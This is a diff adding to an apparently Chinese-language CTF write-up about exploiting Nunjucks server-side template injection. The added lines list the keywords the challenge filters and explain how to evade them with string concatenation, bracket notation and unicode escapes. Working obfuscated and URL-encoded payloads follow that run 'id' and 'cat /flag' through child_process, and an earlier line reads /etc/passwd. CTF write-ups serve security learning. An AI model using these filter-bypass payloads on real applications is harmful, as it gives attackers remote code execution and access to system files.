@@ -168,9 +168,41 @@ Nunjucks 是一个模板引擎，这个题目尝试用 1，1 登录，发现 use
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
 ```
 
-还是会被 ban，尝试其他 payload，最终还是没打出来
+经过 fuzz 测试，过滤了以下字符
+
+```none
+空格|joiner|\'|range|root|cycler|constructor|toString|mainModule|main|require|\.|process|exec|object|file|spawn|eval|concat|base|buffer|from
+```
+
+绕过空格可以用加号拼接，当然加号要经过 URL 编码，用 `[]` 来绕过 `.`，一些关键字用 unicode 绕过
+
+最终 payload
+
+```payload
+{{"string"["toSt"+"ring"]["const"+"ructor"]("return(global[\"\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\"][\"\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\"][\"\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\"](\"\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\")[\"\\u0065\\u0078\\u0065\\u0063\\u0053\\u0079\\u006e\\u0063\"](\"id\")[\"\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\"]())")()}}
+
+// {{'string'.constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
+```
+
+![funnyPHPFlag](images/idExecute.png)
 
 
+
+修改成 cat flag 的命令
+
+
+
+```none
+{{"string"["toSt"+"ring"]["const"+"ructor"]("return(global[\"\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\"][\"\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\"][\"\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\"](\"\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\")[\"\\u0065\\u0078\\u0065\\u0063\\u0053\\u0079\\u006e\\u0063\"](\"\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\")[\"\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\"]())")()}}
+
+// UrlEncode
+%7B%7B%22string%22%5B%22toSt%22%2B%22ring%22%5D%5B%22const%22%2B%22ructor%22%5D(%22return(global%5B%5C%22%5C%5Cu0070%5C%5Cu0072%5C%5Cu006f%5C%5Cu0063%5C%5Cu0065%5C%5Cu0073%5C%5Cu0073%5C%22%5D%5B%5C%22%5C%5Cu006d%5C%5Cu0061%5C%5Cu0069%5C%5Cu006e%5C%5Cu004d%5C%5Cu006f%5C%5Cu0064%5C%5Cu0075%5C%5Cu006c%5C%5Cu0065%5C%22%5D%5B%5C%22%5C%5Cu0072%5C%5Cu0065%5C%5Cu0071%5C%5Cu0075%5C%5Cu0069%5C%5Cu0072%5C%5Cu0065%5C%22%5D(%5C%22%5C%5Cu0063%5C%5Cu0068%5C%5Cu0069%5C%5Cu006c%5C%5Cu0064%5C%5Cu005f%5C%5Cu0070%5C%5Cu0072%5C%5Cu006f%5C%5Cu0063%5C%5Cu0065%5C%5Cu0073%5C%5Cu0073%5C%22)%5B%5C%22%5C%5Cu0065%5C%5Cu0078%5C%5Cu0065%5C%5Cu0063%5C%5Cu0053%5C%5Cu0079%5C%5Cu006e%5C%5Cu0063%5C%22%5D(%5C%22%5C%5Cu0063%5C%5Cu0061%5C%5Cu0074%5C%5Cu0020%5C%5Cu002f%5C%5Cu0066%5C%5Cu006c%5C%5Cu0061%5C%5Cu0067%5C%22)%5B%5C%22%5C%5Cu0074%5C%5Cu006f%5C%5Cu0053%5C%5Cu0074%5C%5Cu0072%5C%5Cu0069%5C%5Cu006e%5C%5Cu0067%5C%22%5D())%22)()%7D%7D
+
+
+// {{'string'.constructor.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag').toString()")()}}
+```
+
+![funnyPHPFlag](images/nunjucksFlag.png)
 
 
 
